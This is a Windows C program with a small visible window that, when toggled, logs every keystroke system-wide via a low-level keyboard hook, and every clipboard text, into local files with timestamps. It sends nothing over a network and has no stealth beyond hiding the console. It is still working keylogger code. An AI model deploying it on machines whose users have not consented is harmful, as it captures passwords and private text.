#include <windows.h>
#include <stdio.h>
#define CLIP 0
#define KEY 1

HHOOK hook = 0;

INT WriteDateTime(HANDLE hFile) {
 SYSTEMTIME st;
 GetLocalTime(&st);
 INT dateSize = GetDateFormat(LOCALE_USER_DEFAULT, 0, &st, NULL, NULL, 0);
 TCHAR date[dateSize];
 GetDateFormat(LOCALE_SYSTEM_DEFAULT, 0, &st, NULL, date, dateSize);
 INT timeSize = GetTimeFormat(LOCALE_USER_DEFAULT, 0, &st, NULL, NULL, 0);
 TCHAR time[timeSize];
 GetTimeFormat(LOCALE_SYSTEM_DEFAULT, 0, &st, NULL, time, timeSize);
 WriteFile(hFile, date, dateSize - 1, NULL, NULL);
 WriteFile(hFile, " ", 1, NULL, NULL);
 WriteFile(hFile, time, timeSize - 1, NULL, NULL);
 WriteFile(hFile, ": ", 2, NULL, NULL);
 return 0;
}

LRESULT CALLBACK KeyProc(INT nCode, WPARAM wParam, LPARAM lParam) {
 if(wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
  PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) lParam;
  DWORD key = p->vkCode;
  UINT mapped = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
  UINT ch = mapped != 0 ? mapped : key;
  TCHAR hex[8];
  sprintf(hex, "0x%02X '%c'", key, ch);
  TCHAR newLine[2] = {13, 10};
  HANDLE hFile = CreateFile("keys.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  WriteDateTime(hFile);
  WriteFile(hFile, hex, 8, NULL, NULL);
  WriteFile(hFile, newLine, 2, NULL, NULL);
  CloseHandle(hFile);
 }
 return 0;
}

INT ClipProc(HWND hWnd) {
 if(OpenClipboard(hWnd)) {
  HANDLE clipData = GetClipboardData(CF_UNICODETEXT);
  LPCWSTR wideClipText = (LPCWSTR) GlobalLock(clipData);
  GlobalUnlock(clipData);
  CloseClipboard();
  if(wideClipText != NULL) {
   INT clipTextSize = WideCharToMultiByte(CP_UTF8, 0, wideClipText, -1, NULL, 0, NULL, NULL);
   TCHAR clipText[clipTextSize];
   WideCharToMultiByte(CP_UTF8, 0, wideClipText, -1, clipText, clipTextSize, NULL, NULL);
   TCHAR newLine[2] = {13, 10};
   HANDLE hFile = CreateFile("clips.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
   WriteDateTime(hFile);
   WriteFile(hFile, newLine, 2, NULL, NULL);
   WriteFile(hFile, clipText, clipTextSize - 1, NULL, NULL);
   WriteFile(hFile, newLine, 2, NULL, NULL);
   WriteFile(hFile, newLine, 2, NULL, NULL);
   CloseHandle(hFile);
  }
 }
 return 0;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam) {
 switch(Message) {
  case WM_CREATE: {
   SetWindowLongA(hWnd, GWL_STYLE, GetWindowLong(hWnd, GWL_STYLE) & ~WS_MAXIMIZEBOX);
   CreateWindow("BUTTON", "Clipboard", WS_VISIBLE | WS_CHILD | BS_CHECKBOX, 10, 10, 100, 25, hWnd, (HMENU) CLIP, NULL, NULL);
   CreateWindow("BUTTON", "Keystrokes", WS_VISIBLE | WS_CHILD | BS_CHECKBOX, 110, 10, 100, 25, hWnd, (HMENU) KEY, NULL, NULL);
   break;
  }
  case WM_PAINT: {
   PAINTSTRUCT ps;
   HDC hdc = BeginPaint(hWnd, &ps);
   FillRect(hdc, &ps.rcPaint, (HBRUSH) (COLOR_WINDOW + 1));
   EndPaint(hWnd, &ps);
   break;
  }
  case WM_CTLCOLORSTATIC: {
   SetBkMode((HDC) wParam, TRANSPARENT);
   return (LRESULT) GetStockObject(NULL_BRUSH);
   break;
  }
  case WM_CLOSE: {
   ChangeClipboardChain(hWnd, NULL);
   UnhookWindowsHookEx(hook);
   PostQuitMessage(0);
   break;
  }
  case WM_COMMAND: {
   if(wParam == CLIP) {
    if(IsDlgButtonChecked(hWnd, CLIP) == BST_UNCHECKED) {
     CheckDlgButton(hWnd, CLIP, BST_CHECKED);
     SetClipboardViewer(hWnd);
    }
    else {
     CheckDlgButton(hWnd, CLIP, BST_UNCHECKED);
     ChangeClipboardChain(hWnd, NULL);
    }
   }
   if(wParam == KEY) {
    if(IsDlgButtonChecked(hWnd, KEY) == BST_UNCHECKED) {
     CheckDlgButton(hWnd, KEY, BST_CHECKED);
     hook = SetWindowsHookEx(WH_KEYBOARD_LL, &KeyProc, NULL, 0);
    }
    else {
     CheckDlgButton(hWnd, KEY, BST_UNCHECKED);
     UnhookWindowsHookEx(hook);
    }
   }
   break;
  }
  case WM_DRAWCLIPBOARD: {
   ClipProc(hWnd);
   break;
  }
  default:
   return DefWindowProc(hWnd, Message, wParam, lParam);
 }
 return 0;
}

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nCmdShow) {
 ShowWindow(GetConsoleWindow(), SW_HIDE);
 WNDCLASSEX wc;
 memset(&wc, 0, sizeof(wc));
 wc.cbSize = sizeof(WNDCLASSEX);
 wc.lpfnWndProc	= WndProc;
 wc.hInstance = hInstance;
 wc.lpszClassName = "wc";
 if(!RegisterClassEx(&wc)) {
  return 1;
 }
 HWND hWnd = CreateWindowEx(0, wc.lpszClassName, "Listener", WS_VISIBLE | WS_OVERLAPPEDWINDOW ^ WS_THICKFRAME, CW_USEDEFAULT, CW_USEDEFAULT, 230, 70, NULL, NULL, hInstance, NULL);
 if(hWnd == NULL) {
  return 1;
 }
 MSG msg;
 while(GetMessage(&msg, NULL, 0, 0) > 0) {
  TranslateMessage(&msg);
  DispatchMessage(&msg);
 }
 return 0;
}